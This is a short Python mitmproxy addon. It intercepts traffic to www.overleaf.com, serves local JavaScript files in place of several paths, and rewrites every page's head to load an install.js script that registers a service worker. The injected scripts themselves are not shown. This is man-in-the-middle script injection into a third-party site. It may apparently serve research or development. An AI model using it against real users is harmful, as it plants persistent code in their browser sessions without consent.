#!/usr/bin/env python3

import os
from mitmproxy import http, ctx, net

JS_MIME = 'application/javascript'


def file_response(filename: str, content_type: str='application/javascript') -> http.HTTPResponse:
    with open(filename) as f:
        body = f.read().encode("utf-8", "replace")
    return string_response(body, content_type);

def string_response(body: str,  content_type: str='application/javascript') -> http.HTTPResponse:
    headers = net.http.Headers(
        Server="lol",
        Connection="close",
        Content_Length=str(len(body)),
        Content_Type=content_type
    )
    return http.HTTPResponse(
        b"HTTP/1.1", 200, net.http.status_codes.RESPONSES.get(200, "Unknown"),
        headers, body
    )
    

def response(flow: http.HTTPFlow) -> None:

    # This will add a script to the <head> of every page in www.overleaf.com
    if flow.request.pretty_host == 'www.overleaf.com':
        ctx.log.info("Installing SW on {}".format(flow.request.pretty_url))
        
        if flow.request.path == '/install.js':
            flow.response = file_response(os.path.join(os.path.dirname(__file__), "install.js"), content_type=JS_MIME)
            return
        if flow.request.path == '/sw.js':
            flow.response = file_response(os.path.join(os.path.dirname(__file__), "sw.js"), content_type=JS_MIME)
            return
        if flow.request.path == '/sw_include.js':
            flow.response = file_response(os.path.join(os.path.dirname(__file__), "sw_include.js"), content_type=JS_MIME)
            return
        if flow.request.path == '/sw_config_overleaf.js':
            flow.response = file_response(os.path.join(os.path.dirname(__file__), "sw_config_overleaf.js"), content_type=JS_MIME)
            return

        flow.response.replace("<head>", "<head><script src=\"install.js\"></script>")

